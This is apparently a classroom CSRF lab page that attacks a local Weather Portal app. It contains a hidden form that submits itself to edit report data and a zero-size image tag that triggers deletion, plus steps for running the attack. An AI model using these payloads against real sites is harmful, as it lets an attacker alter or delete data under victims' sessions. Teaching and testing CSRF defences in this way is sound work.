🎯 CSRF Attack Lab - Shifat's Malicious Weather Page

⚠️ LAB SCENARIO: User "shifat" cannot directly edit other weather stations' reports due to basic checks. However, because the Weather Portal has NO CSRF tokens, shifat can force a logged-in operator/admin to unknowingly modify or delete weather records!

📋 Attack Scenario

Attacker: shifat (Station Operator - restricted access)

Victim: admin or primary operator (must be logged in)

Goal: Force victim to update weather info to fake data or delete a crucial report unknowingly.

🛠️ Method 1: Hidden Auto-Submit Form (POST Request to edit_report.php)

This form can auto-submit when the victim visits this page while logged in:

<form id="csrf-form" action="http://localhost/weather/edit_report.php?id=1" method="POST"> <input type="hidden" name="city" value="FAKE DHAKA"> <input type="hidden" name="temp" value="99°C"> <input type="hidden" name="cond" value="Modified via CSRF Attack by Shifat!"> </form> <script>document.getElementById('csrf-form').submit();</script>

🛠️ Method 2: Image Tag GET Request (For delete_report.php)

For actions that use GET (like delete_report.php), a stealthy image tag can trigger immediate deletion:

<img src="http://localhost/weather/delete_report.php?id=1" width="0" height="0">

🚀 Execute the Attack

Steps to demonstrate in Lab:

  1. Login to the Weather Portal as admin or any authentic user in one browser window.
  2. Open this attack page (`attack.html`) in another tab.
  3. Click the execution button below.
  4. Go back to the Weather Portal Home — Report ID 1 will be completely modified using the Admin's authorization!
💡 Why this works: The browser automatically attaches the victim's valid session cookie when making the request to `edit_report.php`. Since the Weather Portal doesn't require an anti-CSRF token, it trusts the request blindly!
